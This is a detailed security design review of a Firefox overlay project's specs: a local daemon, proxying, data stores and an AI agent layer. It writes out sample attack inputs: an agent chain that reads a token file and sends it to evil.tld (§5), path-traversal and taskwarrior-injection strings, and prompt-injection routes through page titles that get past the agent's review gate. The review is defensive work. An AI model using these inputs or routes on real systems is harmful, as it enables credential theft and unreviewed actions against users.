# Design Review — 2026-08-14

Six independent adversarial reviewers over all 22 specs, with distinct lenses. **109 findings, 23 critical.** Every reviewer verified claims against shipped code, the local Firefox `omni.ja`, or upstream sources rather than from memory; the ones that matter carry citations.

This file is the durable record. Findings are ranked within each section; fixes are the smallest change that resolves the defect.

**Status — 2026-08-14, same day.** Option (a) was chosen: apply every correctness and security fix across all 22 specs, leave the roadmap intact. All critical and high findings in §§1–5 are applied to the specs, and the medium/low ones are applied where they were spec-level text rather than scope changes. §0's shipped-code bug is fixed in code with the guards asserted. §6's budget and coherence findings are recorded here but **not** acted on, because acting on them means cutting specs — that remains an open decision, and the four specs the audit names as generalising for a hypothetical audience (x2, d5, d7, half of r5) are still in the roadmap.

| Lens | Scope | Findings | Verdict |
|---|---|---|---|
| Correctness + Gecko feasibility | r1–r5 | 23 | not safe to build as written |
| Panel-primitive fit + Places/Downloads APIs | p1–p3 | 16 | not safe to build as written |
| Trust boundary | d1, d5, d6 | 19 | boundary not sound; d6 needs redesign |
| Data integrity | d2, d3, d4, d7 | 24 | would damage unrecoverable records |
| Prompt injection / agent safety | a1–a3 | 15 | five total bypasses of the review gate |
| Budget + cross-spec coherence | all 22 | 12 | v2.0.0 is the project-killer |

---

## 0. Bug in shipped code — fix independently of everything else

**Any unreadable store file is silently replaced with an empty one on the next write.**

`aether-graveyard-service.sys.mjs:33-41` catches *every* read error (`console.info("graveyard file unreadable, starting empty")`) and calls `deserialize(text)`, which returns an empty store on bad JSON (`aether-graveyard.sys.mjs:69-73`). `_persist()` (line 78) then does `IOUtils.writeUTF8(path, text, {tmpPath})` — an atomic rename over the file, with no `backupFile`. `aether-workspaces-service.sys.mjs:40-43,80` is identical.

One transient I/O error, permissions blip, or partial write, followed by closing a single tab, destroys the entire 500-entry graveyard and all workspace state. Unrecoverable.

**Fix**: distinguish "file absent" (start empty — correct) from "file present but unreadable" (refuse writes, surface the state). A store whose last read failed must never persist. Add `backupFile` to both write options. This is the same choke point d7 needs, so building it now makes d7 cheaper later.

---

## 1. v1.2.0 — the rice pass (r1–r5)

### Critical

1. **`:reload` collides with the shipped `reload` command.** `aether-palette.sys.mjs:30` has `reload: {}`, `aether.uc.js:200` implements it as page reload, `aether.toml:114` binds `"r"`. Registering r1's config-reload overwrites it — and r1's test 13 **passes today, unmodified, against the page-reload entry**, so the test cannot detect that the feature was never wired. → rename to `config_reload`; assert the two are distinct entries.

2. **"Parse failure is a no-op" is unimplementable with the shipped parser.** `parseToml` cannot fail: lines without `=` are skipped, junk becomes a string, nothing throws, no line numbers. `load()` returns `deepMerge(DEFAULTS, parsed)`, so **absent keys resolve to DEFAULTS, not to previously-live values**. The 1s watcher reading a file mid-write (any `>` redirect, `sed -i`, `git checkout`) silently reverts the whole keymap to defaults and reports `reloaded: theme, keymap, statusbar`. Visual test 5 fails on day one. → `parseToml` returns `{ok, sections, errorLine}`; stat-twice before reading; `!ok` keeps the previous config.

3. **The r4 panel has no mode in the key engine, so its search field cannot receive a keystroke.** `aether.uc.js:272` installs a capture-phase listener routing every key through four modes; normal-mode printables return `swallow` + `preventDefault`. The palette works only because `aether-keys.sys.mjs` has an explicit `case "palette"`. r4 lists no change to that module and defines no `panel` mode. Every r4 unit test still passes, because they test the pure module with no engine. → add a `panel` mode; list the module in §3.

4. **`Ctrl+n` in the panel opens a new tab; `Ctrl+p` opens the print dialog; `Space` can't both filter and mark.** `C-n` is a reserved chord — Aether's in every mode, which is f1's core proof. `C-p` is unbound so Firefox's accelerator fires. And `Space` is listed as "toggle mark" while `type` is "filter", with focus in a text input. → arrows only; a non-printable for marking.

### High

5. **`m<char>`/`'<char>` need operator-pending semantics the engine lacks.** It matches exact literal sequences; pending exists only when the buffer is a strict prefix of a *declared* binding. `"m" = "mark_set"` fires immediately on `m`. Also: pins `1`–`9` are in the prose but not the TOML surface, breaking the f0 sync-guard pattern. → add `{kind: "await_char", command}`; put all eleven bindings in the TOML block.

6. **r2's example `[style]` values are not the shipped constants**, so the sync guard (test 12) and the pixel-identical claim (visual test 1) cannot both hold. `userChrome.css` ships `radius: 2px`, `gap: 1em`, `12px monospace`, no opacity, no blur. Also `pad = "4px 8px"` fails r2's own single-length validator. → use the real constants; split `pad` or state a two-length grammar.

7. **The TOML subset has no float support.** `parseValue` handles bools, `/^-?\d+$/`, strings, arrays — `0.96` falls through as the *string* `"0.96"`. Breaks r2's sync guard and r5's round-trip test 5. → add a float branch, or express opacity as an integer percent.

8. **Deleting f4's CSS while leaving f4's prefs un-reverts zero-chrome.** f4 shipped two halves: `user.js:59-60` turns the native strip *on*, `userChrome.css:26-77` hides it. r4 removes only the CSS, so the strip and launcher render permanently — and visual test 7 passes anyway. `tabs_toggle` also stays in REGISTRY/DEFAULTS/README as a command that silently does nothing. → revert the prefs, delete the command, assert *no sidebar element visible*.

9. **Tab metadata "follows a tab into the graveyard" across two stores with no join key.** Metadata lives in `aether-workspaces.json`; the graveyard is a separate file with its own `nextId`, and a resurrected tab is a fresh `gBrowser` tab. Test 12 is unwritable as stated. → put metadata on the graveyard record (additive field); marks resolve live-first, then graveyard.

10. **Reloading the keymap rebuilds the engine and drops you out of insert mode.** `createEngine` owns `{mode, buffer}` and starts in `normal`. Your wal hook or a `git pull` touches the TOML mid-sentence and the rest of your typing is swallowed. Hint mode orphans the content-side overlay. → preserve mode across rebuild; skip the keymap domain while `mode !== "normal"`.

11. **r5 test 8 ("SCHEMA covers every leaf in DEFAULTS") forces 44 rows the spec says must not be editable** — 21 keymap bindings, 4 reserved, 19 theme colours — contradicting "no keymap editing" and "no colour picker". The keymap isn't a fixed leaf set either. → state the exclusion in the spec (`keymap.*`, `theme.colors`) and assert the exclusion list itself.

12. **r5 tests 5 and 6 are mutually unsatisfiable.** Test 5 demands exact `emitLocalToml`→`parseToml` round-trip; test 6 demands escaping of `"`/newline/`]`/`#`. The parser has no escape handling (`v.slice(1,-1)`) and is line-based, so a newline can't be represented at all. → replace escaping with *rejection* in `setOverride`.

### Medium / low (11 more)

MRU "row 1 is the previous tab" contradicts itself and test 6 asserts the broken version · `DOMAIN_MAP` omits `focus` and `workspaces.resurrect`, so test 10 fails before r2 lands · `[privacy] doh` exists in both TOML and a pref with no stated authority · editing a pref-shadowed row writes a value the pref overrides · `shouldShow` can't answer test 8 (no elapsed arg) and `?` root list contradicts test 9 · r3 visual test 4 proves the opposite of its claim · `applyStyle()` clobbers the reduced-motion override on every reload (→ do it in CSS) · the watcher is per-window: N windows = N pollers, N reloads, N messages · `[panels] width` "falls back to `[style] panel_width`" is dead config under `deepMerge` · new `aether-strings` exports must survive f6 test 11's harness, which calls every export as `fn(task, "34m")` · r1 cites b1 as polling precedent; b1 doesn't poll.

---

## 2. v1.4.0 — panel sources (p1–p3)

### Critical

13. **All three claim "r4's primitive reused unchanged"; it cannot serve them unchanged.** r4 has no operation that changes the row set after construction. p3 needs live rows, p2 needs removal after forget, p1 needs it after delete/tag. Worse, r4 never defines what happens to a *mark* or *selection* whose row ceases to exist — and p3's rows vanish asynchronously mid-keystroke. Mark row 2, `Tab` to cancel, a transfer completes in the 200 ms before `Enter`, and you cancel the wrong one. → add `replaceRows(state, rows, {keyBy})` to r4 with key-addressed marks that drop rather than retarget; or freeze p3's row set and make only the state cell live.

14. **`Downloads.getList()` is called wrong and is the wrong list.** Verified against local `omni.ja`: `getList(type)` takes a **required** arg and returns `undefined` with none. And completed downloads are **not persisted** — `DownloadIntegration.shouldPersistDownload()` returns false for stopped downloads on desktop; past downloads live in `DownloadHistory.getList()`, which is Places-backed. p3's panel is empty after every restart. Also, `ALL` includes private-window downloads and p3 never mentions private windows. → `Downloads.getList(Downloads.PUBLIC)` for the widget, `DownloadHistory.getList()` for the panel.

### High

15. **p2 names an API that cannot answer p2's query and forbids the only one that can.** `PlacesUtils.history` has no "visits between t1 and t2" method — its surface is `fetch`/`fetchMany`/`insert`/`remove`/`hasVisits`/`clear`. The options are the *synchronous* `nsINavHistoryService` (janks the browser), `PlacesQuery.sys.mjs` (the modern fit, unmentioned), or SQL over `promiseDBConnection()` — which "never raw SQLite" appears to ban. → name `PlacesQuery` and its three methods; restate the rule as "read-only, through `promiseDBConnection()`".

16. **p2's `forget` under-deletes bookmarked pages and deletes p3's rows as a side effect.** `History.remove()` preserves `moz_places` rows with `foreign_count > 0` and returns `false` — a return value p2 never handles. Meanwhile `DownloadHistoryObserver` listens for `page-removed` and drops matching downloads. And nothing purges x3's `history` frecency key. Visual test 5 passes because its fixture was never bookmarked. → check the boolean, say so in the statusbar, purge frecency, acknowledge the download coupling.

17. **p2's `visitId` is not obtainable from the listener p2 uses to record it.** A web-progress listener has a URL and a browser, not a visit id; `visitId` is exposed only via `PlacesObservers` `page-visited` or `History.insert`. And the read side (`PlacesQuery.formatRowAsVisit`) returns no id and `GROUP BY url` collapses visits anyway. The join key exists on neither side. → key by URL with last-write-wins, and pin the two-workspaces-one-URL case.

18. **p2's `all` scope breaks x3's stated envelope.** x3 justifies "no index, no worker" with "hundreds, not millions" and guards at 5,000. `all` over a year is 10⁵–10⁶ rows, linear-scanned per keystroke on the chrome main thread. p2 caps *rendering*, not fetching. → bound the fetch; push filtering into SQL.

19. **p3's "no argument the page influenced" is false.** The filename — hence the extension, hence the OS handler — comes from `Content-Disposition`. Firefox gates this with `always_ask_before_handling_new_types`; p3 inherits none of it and asserts the risk away in prose. Also, open-file and open-folder are panel actions with **no registry command and no risk class**, while a1 declares the registry *is* the API. → delete the claim; reveal-in-folder as default; give both a command and an honest class.

20. **p1's `normalizeUrl` is one rule presented as a policy, and the rule is wrong for hash-routed pages.** Stripping the fragment makes `…/spec.html#section-4.2` and `app/#/settings` collide with their parents — and since the normalized URL is the stored identity, *opening the bookmark navigates to the stripped URL*. Scheme, host case, trailing slash, default port, `www.`, param order are all unspecified, and each is a silent duplicate-or-collide. → keep the fragment; enumerate the full policy; assert re-`b` doesn't clobber a rename.

### Medium / low (5 more)

`anyFailed` latch is state in a spec claiming no state, tested through a pure function that can't hold it · p1's bulk delete is irreversible with no confirm and no `bm_delete` command, in a project whose tab model is built on recoverability · p1 creates the duplicate store p2 forbids, with `Ctrl+D` still writing to Places · `bm_import` "once" has no defined second run · p1's tag editor is a panel-inside-a-panel and r4 has no stack, no confirm key, and no defined `Enter`-on-empty · p2's prune rule is vacuous (nothing is older than an unbounded scope) and ring eviction silently degrades the workspace scope · p3's widget has no coalescing and reimplements `Downloads.getSummary` · p1 adds copy with no strings module and no lexicon sweep.

---

## 3. v2.0.0 — daemon trust boundary (d1, d5, d6)

### Critical

21. **d6's fail-closed guarantee is defeated by Firefox's own proxy failover.** `network.proxy.failover_direct` defaults true — when proxies in a channel's chain fail, Necko retries DIRECT, *below* the filter. `nsProtocolProxyService` also keeps a failed-proxy blocklist (`retry_timeout`, 1800s), so one refused connection makes subsequent channels skip the proxy. And `applyFilter` **has no "block" return value** — returning nothing means DIRECT, which is exactly the naive implementation of the spec's sentinel. → set `failover_direct=false` and `allow_bypass=false` as overlay-owned prefs and assert them; define fail-closed as an explicit `channel.cancel()`; the scenario must kill the proxy *after* Firefox marks it bad. ([1207798](https://bugzilla.mozilla.org/show_bug.cgi?id=1207798), [1779005](https://bugzilla.mozilla.org/show_bug.cgi?id=1779005))

22. **d6 never mentions DNS, and per-channel proxying has a documented open DNS leak.** Bug [1799411](https://bugzilla.mozilla.org/show_bug.cgi?id=1799411) is **open**, against `proxy.onRequest` — the same `registerChannelFilter` substrate — covering HTTPS-RR/SVCB lookups, prefetch, and `browser.dns.resolve`. `network.proxy.socks_remote_dns` is profile-wide, not per-channel; the per-channel lever is `TRANSPARENT_PROXY_RESOLVES_HOST`, unmentioned. TCP goes through the proxy; the list of everything you visited does not. → pass the flag, disable prefetch/predictor/HTTPS-RR, and state the residual leak honestly rather than implying it's closed.

23. **d6's internal-traffic override is fail-OPEN by construction.** "Channels with no attributable tab resolve to direct" defines *internal* as *attribution failed*. Service-worker fetches (a site registered in a proxied workspace keeps fetching direct, with cookies, after the tab closes), OCSP (carrying the cert serial of the site you just loaded), favicons, beacons, prefetch — all leak. → invert: internal-direct is an explicit *destination allowlist* (f7 gateway, d1 daemon, `about:`/`chrome:`); everything unattributable takes the current workspace's proxy or fails closed.

### High

24. **d1 credits the wrong rule for the wrong attacks.** `Origin` is not sent on no-CORS GET subresources (`<img>`, `<script>`, `<iframe>`), GET form submissions, or top-level navigations — all of which reach the handler. What stops them is the *token*. And after a successful DNS rebind the page is same-origin, so same-origin GETs carry no Origin at all — the rule is silent precisely in the rebound case; what defeats rebinding is the `Host` literal rule. → restate what each rule actually does; require `Content-Type: application/json` on POST; reject `Sec-Fetch-*`.

25. **d1 never specifies how the WebSocket carries the token, and the Origin rule probably rejects the overlay's own socket.** The browser WS API cannot set headers, so the default implementation is a query param — which lands in access logs and in the `error.message` d1 renders **verbatim** in the statusbar. d5 has a no-secrets-in-logs test; d1 has none for its own token. And a chrome-context `WebSocket` likely sends *some* Origin, in which case `/v1/events` rejects the overlay forever; allowlisting `Origin: null` reopens the hole for sandboxed iframes and `data:` documents. → `Sec-WebSocket-Protocol: aether.token.<token>`; add d5's sentinel test; spike the chrome-context Origin value first.

26. **d1 invokes a timing argument and omits constant-time comparison.** It reasons carefully about an oracle it doesn't have (a page can't read the 401) and never mentions the one it does: naive `==` over loopback, with no rate limit or lockout. → constant-time equality; failed-auth counter.

27. **d5's action path templates are unvalidated interpolation into an authenticated URL.** `{id}` comes from the browser with no encoding, no charset restriction, no re-check against the template. `remote_action restart "../../admin/shutdown?confirm=1#"` becomes a POST to `/admin/shutdown` **with the bearer token attached** — and under a1 that's one `confirm` line an injected agent needs you to skim. → encode as a single path segment, reject `/`/`?`/`#`/`..`, assert host and path-prefix before sending.

28. **d5 says "the daemon does the TLS" and specifies no TLS.** No cert verification, no hostname verification, no trust store, no minimum version — while the example host is `powerhouse.internal`, which will have a self-signed cert. The predictable 1am outcome is `danger_accept_invalid_certs(true)`, which passes test 12 because the URL still starts with `https`. → verification not disableable; `ca_bundle` per endpoint; mTLS paths; assert `danger_accept_invalid_*` appears nowhere in the crate.

29. **The daemon is a same-user confused deputy and the trust model is never stated.** `0600` protects against other *users*, not against any process running as you — the actual threat on a workstation running npm/cargo/pip. Such a process reads the token and gains `exec` (d3), VPS credentials (d5), and store decryption (d7). So d5's "no credentials in the browser" and d7's encryption *relocate* secrets rather than protecting them. The `ProtectSystem=strict`/`NoNewPrivileges` line reads as "sandboxed" and constrains no same-uid client. → state it honestly in all three specs; consider a unix socket in `$XDG_RUNTIME_DIR` with `SO_PEERCRED`, which also deletes findings 24 and 25 outright.

30. **Daemon strings are rendered "verbatim" into privileged chrome UI.** f7's `textContent`-only rule is dropped by d1 and d5 — unbounded, control-character-bearing, and in d5's case interpolating *remote* response text into a daemon-rendered widget string. One `innerHTML` in statusbar glue is chrome-privileged XSS. The lexicon sweep is also weaker than claimed: it can only cover static strings, and d5's errors interpolate hostile remote text. → `textContent` only, truncated, control-stripped, **in the overlay**; narrow the sweep claim.

31. **The overlay never authenticates the daemon.** It sends its bearer token to whatever is listening on the fixed port 7717, and backs off "silently, forever" until something answers. A same-user process that binds first at boot harvests the token, then serves fake capabilities, fake decrypt responses, and attacker strings into the statusbar. → random port recorded in the `0600` file; HMAC-nonce daemon proof; or the unix socket.

### Medium / low (5 more)

`daemon_off` stops the *browser*, not the daemon's polling and writes — it is not "the same property f7's kill switch has" · `cmd:` secret resolution is unconstrained exec that escapes d1's own capability model, with no timeout · no response size cap, so the credential-holding daemon is OOM-killable by the endpoint it trusts · redirect rule covers host but not scheme, port, or `Authorization` stripping · WebRTC never touches Necko and is unmentioned (→ `media.peerconnection.ice.proxy_only`) · no token rotation or revocation · token file check omits directory mode, ownership, and symlinks · `:net_check` verifies the *daemon's* egress, not the workspace's, while claiming to report what the outside world sees.

---

## 4. v2.0.0 — data integrity (d2, d3, d4, d7)

### Critical

32. **d7's "never silently recreated empty" is contradicted by the two stores it names** — see §0. Turning on `[crypto]` today and restarting the daemon at the wrong moment destroys the graveyard.

33. **d3's timewarrior sink destroys your own in-progress tracking.** `timew start` is not additive — it **closes the currently open interval**. You're on `timew start deep-work`, a rule fires, your interval is silently stopped and never resumed. Symmetrically your later `start` closes the daemon's, and its eventual `stop` closes yours. → never `start`/`stop`; emit closed intervals with `timew track <start> - <end>`, never passing `:adjust` (which *modifies or deletes* overlapping intervals).

34. **argv arrays do not stop injection into `task`/`timew`.** The real sink is taskwarrior's own DSL: attributes parse "anywhere on the line", and `rc.<name>:<value>` overrides are accepted on the command line. A page titled `Fix the parser rc.data.location:/tmp/x` writes into a throwaway data dir; `status:deleted` creates a pre-deleted task; `depends:1,2,3` mutates unrelated tasks; `rc.hooks:off` skips your sync hooks. GitHub and Jira titles routinely contain colons — no malice required. Scenario 7 tests *shell* injection and passes on day one while the DSL class is wide open. → `task import` with JSON, or `task add --` plus rejection of `^rc\.` and `^[a-z_]+:` tokens; rewrite the fixture to assert *fields*, not argv.

35. **Browser death, suspend, and clock steps invent hours.** Moving dwell into the daemon does not address the failure the spec names: a dead browser sends neither the next transition nor `idle_start`. Crash at 14:00, relaunch at 18:00 → a 4-hour PR review in both stores. Lid close → 16 hours. NTP step back → `end < start`. No monotonic clock, no disconnect rule, no max-dwell cap, no suspend detection; test 14 covers only *graceful* shutdown. → `CLOCK_MONOTONIC` + `CLOCK_BOOTTIME` divergence, disconnect closes engagements, hard max-dwell, UTC instants.

36. **Positional taskwarrior/timewarrior ids mean writes and deletes hit the wrong records.** Task ids renumber; timewarrior `@N` shifts as intervals are added and there is no stable interval UUID. "Created and immediately completed" is two invocations — run `task 7 done` in your terminal between them and the daemon completes *your* task. The review panel's delete on a stale `@3` removes an interval you recorded by hand. → address by UUID (`task import` sets it); re-resolve intervals by start-time+tag immediately before deletion and abort on 0 or >1 matches.

37. **d4's `gap_threshold` converts unobserved time into *measured* time by construction.** A block is `{start, end}` and every sub-threshold gap is inside `end - start`. Thirty 2-minute gaps in a normal day = an hour of invented time, in the tier defined as ground truth. Raising the threshold makes it worse. → duration is `sum(engagements)`; carry `unobserved` as a third quantity.

38. **The ActivityWatch round-trip launders inferred spans into measured ones.** The tier rule says measured = "…or recorded by an AW watcher", the daemon writes to AW, and nothing excludes inferences from that write. Accept a 90-minute AI gap-fill, it lands in AW, next week it reads back as measured with `inferredFraction: 0.0`. Test 6 covers the *module* round-trip, not the AW hop — the only durable store. → only measured spans reach AW; AW-watcher data becomes a third tier (`external`), not measured.

39. **d7 ties encryption state to config rather than to the file.** Flip `enabled = false` to debug, or drop a store from the array, or use a stale dotfile on machine two — nothing calls `isEncrypted`, the plain reader sees ciphertext, starts empty, and the first write clobbers it. → `isEncrypted` runs on every read unconditionally; encryption is a property of the bytes, never of the TOML.

### High

40. **d2's MPRIS claims are wrong on the point the feature exists for.** Firefox registers **one bus name per instance** (`…firefox.instance<PID>`), not one per tab ([1648024](https://bugzilla.mozilla.org/show_bug.cgi?id=1648024)). Two playing tabs are one MPRIS player that cannot be named or switched — which is exactly the spec's opening pain ("a tab I can't find without hunting"). Metadata is page-dependent (MediaSession or nothing), `CanSeek` requires a page `seekto` handler, and `mpris:length` exposure is a separate bug. → per-tab identity from `gBrowser` (which tracks `soundPlaying` per tab, needing no daemon); MPRIS only for external apps.

41. **Accepting an inference erases its origin; merge-then-accept promotes a mixed span wholesale.** `accept` flips `source` to measured with no retained origin, so `summarize` cannot distinguish "I watched this" from "a model guessed and I clicked yes at 1am". A week of accepts yields a report reading `inferred: 0%` over a 40% model-generated timeline. Test 5's export inventory is blind to `mergeBlocks` setting `source` internally. → immutable `origin` + separate `reviewed`; three numbers in `summarize`; property-test over random merge/split/accept sequences.

42. **AI labels and model-drafted report numbers carry no tier.** A measured block with an invented label renders identically to a hand-written one. And nothing checks the report's *numbers*: a model writing "roughly three hours" over 1h50m of blocks passes tests 9 and 10 while the header truthfully reports 0% inferred. → `label_source` per block; totals template-injected from `summarize()`, with a post-check rejecting digits not in the injected set.

43. **Regroup has no identity key.** GitHub prefixes `document.title` with a notification count that changes several times during a review — if the key includes `{title}`, one review becomes four tasks; if it's per-rule only, two PRs collapse into one. No fire cap either. → identity is `(rule, capture tuple)`, never `{title}`; per-rule hourly budget with self-pause.

44. **d4's backfill idempotency is asserted by a test that cannot exercise the duplicating case.** A clean reconnect was never at risk; the risk is a crash between POST and acknowledgement, needing an fsynced watermark the spec doesn't describe. AW down six hours, 380 of 400 events sent, OOM → 380 duplicates in the real store. → fsynced watermark or deterministic event ids; state whether `/events` or `/heartbeat` is used; simulate the crash.

45. **No key backup path.** No export, no escrow, no warning before `:crypto_encrypt`. A keyring reset or OS reinstall makes the graveyard, bookmarks, workspaces and timeline permanently unreadable — and, correctly, undeleted, so they sit on disk forever. For a personal tool this is a larger real risk than the attacker. → refuse `:crypto_encrypt` until `:crypto_export_key` has been acknowledged; keyring re-acquire loop for late desktop unlock.

### Medium / low (9 more)

`:tasks` has no journal, so delete cannot work after a restart (or re-queries by tag and deletes your own tasks) · d7's AAD omits the version byte and any key id, and gives no rollback protection · migration atomicity cites an fsync f4's pattern doesn't perform, and never states one-file-vs-many · d3's flagship glob doesn't match its flagship URL (`*` and `/`), named captures are undefined, anchoring unspecified · `inferredFraction` has no defined unit and its test passes under both · subprocess/gateway text bypasses the f6 lexicon sweep and is rendered verbatim · locked-store writes are silently dropped and scenario 4 certifies the drop as success · "rejection is the default outcome of ignoring it" has no reaper, and scheduled enrichment contradicts "always an explicit act" · d3/d4 rebuild the session history f6 cut as *identity*, unacknowledged · d2's no-tap test grades the daemon's own refcount, and a monitor tap hears private-window audio.

---

## 5. v2.1.0 — agent safety (a1–a3)

### Critical

46. **The MCP control plane has no specified authentication, binding, or origin rule.** a1 says the tool list "is exposed over decision #2's MCP layer" and lists "MCP endpoint" as glue — that is the entire transport spec, with no test. This is a regression against d1, a strictly *less* powerful surface, which specifies token, Origin rejection, Host literal, non-configurable bind, and four cargo tests. And nothing says MCP calls must construct a plan rather than dispatching directly — the natural implementation is direct dispatch, which bypasses the review gate entirely. → inherit d1's rules verbatim; state that *every* MCP call materializes a plan.

47. **`plan_run` is unreviewed, untainted, re-runnable execution behind one approved line.** `plan_save`/`plan_run` have no risk class, aren't `agent: false`, and taint is never written into the saved JSON. A tainted plan becomes a file; re-run in a fresh conversation, its steps resolve at the *untainted* policy. And the review surface shows one line — the invocation, not the 40 steps. "A poisoned page can corrupt a plan I am about to read" fails because what you read is a pointer. → both `agent: false`; if kept, record authoring taint and render expanded steps.

48. **`navigate` + `page_read` reads arbitrary local files with zero prompts.** `page_read` is `read` class, `read` and `navigate` stay `auto` even when tainted, and a2 places **no scheme restriction** on perception. `tab_open("file:///home/devsupreme/.config/aether/daemon-token")` → `page_read()` → `tab_open("https://evil.tld/?d=…")`. `assertNoSecrets` checks field *types*, not schemes. The token is d1's full authority: exec, VPS credentials, store decryption. Also no per-conversation read budget. → `page_read` refuses non-http(s), enforced in the child and re-enforced in the serializer; non-http(s) navigation is not `navigate` class.

49. **The agent can turn on its own perception and action.** `perception_on`/`action_on`/`agent_on` have no risk class and aren't `agent: false`, while a1 §6 states the principle exactly right and then doesn't annotate the commands that violate it. `action_on` at `mutate-local` is one confirm that reads like a settings toggle. → all three `dangerous` **and** `agent: false`; `_off` variants stay callable.

### High

50. **Taint is keyed to which command produced the data, not to where the data came from.** d3 writes raw page `{title}` into taskwarrior; `tasks` is `read`. p1 stores page titles; `bm` is `read`. f4/f5/p2/r4 all carry page-supplied strings. d5 returns remote strings. a1's own `actions` log replays every argument. So: get a page dwelt on for 3 minutes with an injected `<title>`, wait for d3's rule to fire, then days later in a *clean* conversation ask "what did I work on?" — the attacker's text enters an **untainted** context and every gate sits at base policy. → taint by data provenance; default tool results to tainted with a short allowlist of provably chrome-authored ones.

51. **Exfiltration is a `navigate`, and `navigate` never prompts.** A URL is a write channel; DNS alone is one. The compensating control is a single Enter over a heterogeneous list, with no rendering contract for long arguments — a 1,800-char base64 URL as step 6 of 6. → under taint, navigation to a registrable domain not already in the conversation's read set escalates to confirm; truncate and mark new-host steps in the render.

52. **The cross-origin gate compares the wrong pair, granularity, and time.** Wrong pair: the threat is "injection came from A, act anywhere" — read A, navigate to B, read B, act on B defeats it while `readHost == actHost`. Wrong granularity: "registrable hosts" is cross-*site*, so `attacker.example.com` equals `banking.example.com`, scheme and port are unmentioned, and b1's PSL-less walk collapses `evil.github.io` with `victim.github.io`. Wrong time: the act host is fixed at plan-build; a meta-refresh or slow load between approval and execution changes the target silently. → full origins; gate on `tainted && act`; child asserts the principal at act time.

53. **Model output is rendered into the consent surface with no sanitization requirement.** a2 test 2 strips control/bidi characters *entering* the model; nothing strips anything *leaving* it, and a1's only hostile-string test covers the log, not the plan render or the confirm prompt. A newline in an argument forges two fake plan lines; RTL override makes an evil URL render as a bank URL; homoglyphs disguise a command name. And "Enter runs, anything else declines" makes the approving keystroke the most-pressed key in a keyboard-driven browser. → extend the log's bounding rule to the render and prompt; reject non-ASCII command names at `validatePlan`; guard against in-flight keystrokes.

54. **The page-action review surface shows descriptors, so it cannot be reviewed.** `run page_click(button.btn-primary)?` carries no information about what the button does; the flash fires *after* approval. → the prompt shows the resolved element's accessible name and visible text, bounded and bidi-stripped, plus the host.

55. **`plan_save` has no path-safety requirement**, unlike b1's `boostFileName` and x2's `modDir` which both have dedicated tests. `plan_save("../commands/00-init.js", …)` writes into the directory x1 loads as **privileged JS with no sandbox**. → `planFileName()` with b1's guarantee; copy b1 test 4 verbatim.

### Medium / low (5 more)

`riskFloor` floors *risk*, not *consent* — a user who sets `mutate-local = "auto"` removes the floor's entire protection, and a user who softens `dangerous` to `confirm` restores the agent's ability to `mod_enable` (arbitrary privileged JS) · x1 hooks run inside the dispatcher, so approved arguments ≠ executed arguments, and the log records one of the two without saying which; `redact` is argument-*name*-driven, so a mod author selects what the log omits · a3's classifier consumes page-controlled `<title>`, so any site can make itself exempt (`<title>rebase drill</title>`) or burn the one-per-session offer early · a3's "the data does not exist" is false — a1's log records every `nudge_dismiss`, p1 timestamps every capture, d3/d4 store the drift events · taint lifetime is undefined against f7's per-window conversation, and `ai_on`/`ai_off` aren't `agent: false`.

---

## 6. Cross-cutting — budget and coherence

Calibrated against shipped code: f1–f7 = 3,660 lines, b1–b3 = +1,477, **~40% of every feature lands in glue**.

| Version | Est. added | Running total |
|---|---|---|
| v1.2.0 | +2,475 | 7,612 |
| v1.3.0 | +1,805 | 9,417 |
| v1.4.0 | +950 | 10,367 |
| v2.0.0 | +2,375 overlay **+ ~5,000 Rust** | 12,742 |
| v2.1.0 | +1,550 | **14,292** |

Plus ~18,000 lines of test code at the measured 1.28× ratio. `aether.uc.js` projects to **5,776 lines**. That is roughly the size of Zen's overlay — the project CLAUDE.md cites as bus-factor 1.

56. **v2.0.0 converts a zero-dependency single-language overlay into a two-language distributed system with seven upstreams** (D-Bus/MPRIS, PipeWire, ActivityWatch, taskwarrior, timewarrior, Spotify, Subsonic/ytmusic, plus two private services). ~15 crates, a build step, a systemd unit, security-critical Rust written while learning Rust — and it *adds* ~1,150 lines to the glue file rather than relieving it. d3 additionally maintains one matcher twice, in two languages, forever.

57. **"The glue refactor rides along" is not credible.** `aether.uc.js` is one `class Aether` with ~90 methods and 558 `this.` references sharing mutable state — there is no seam. v1.2.0 adds ~880 lines of new glue while attempting to extract from 2,036; ending flat requires extracting 43% of the file in the same evenings that ship five features, in the only untested 40% of the codebase. → make it a milestone with a number and a CI line-count ceiling on that one file.

58. **r4's "one contract for every panel forever" is contradicted by four of its five consumers** — d2 wants a different body and `Space` = play/pause, r5 wants grouped rows with inline editors, p3 wants live rows, d4 wants tab groups (which r4 explicitly cut). → design the primitive against *two* structurally different sources in the same pass; demote d2's mini-player and d4's timeline out of "panel source" language.

59. **"The registry is the API" is already false the moment r4 ships.** r4 declares 7 commands but defines 7 panel *actions* plus multi-select; p1 has 6 actions to 4 commands; p3 has 7 to 5; d5's `remote_action` stands in for arbitrarily many. By v2.1 that's ~30 more commands with argument schemas and a way to express "apply to these six". → make panel actions registry commands at r4, where it's nearly free.

60. **x4 cannot be built on x1.** It needs page action (that's a2, two versions later), network (x1 grants none, d5 forbids it), and arbitrary file read (x1's storage is one file per script). Half its command table and the entire `git:review` workflow are unbuildable in v1.3. → move the facade freeze after a2, or cut x4 to style + URL-parsing commands.

61. **a3's central safety claim is falsified by d4, one version earlier.** d4 stores `focus_task` per block and `summarize` produces totals by task; time-off-task per session is a trivial derivation. a3 also reintroduces focus *history* — which f6 cut as "identity, not deferral" — and sources it from d3/d4 rather than f6. → rebuild a3 on f6's in-session state alone (~150 lines, no daemon dependency), or delete the claim.

62. **x2 over-claims b1's sanitizer, silently rewrites b1's shipped matcher, and opens the first arbitrary-URL fetch in the overlay.** b1's own honest edge is "lexical, not a CSS parser"; x2 upgrades that documented limitation into a boundary that justifies one-command install from a URL. Its "exact-or-declared" matching and mod-then-user ordering are *changes* to `resolveBoost` and the single-`<style>` apply path, framed as reuse. And `mod_install <url>` is a privileged arbitrary-URL fetch that no spec names as an exception to f7's loopback rule.

63. **Four specs generalise for a hypothetical audience** — the documented failure mode. **x2** argues from "Zen has Mods and they're popular" (market-derived, retired July); its tiers, remote install and namespace arbitration only mean anything with an ecosystem. **d5** responds to "I can't read these repos" by building the general case. **d7** is off-by-default encryption on a single-user machine whose own non-goals concede full-disk encryption is the honest answer. **Half of r5** is a settings product for someone who didn't write the dotfile. **d2's search backends** are three per-service adapters in a spec whose Thinnest says "no per-service adapters, ever".
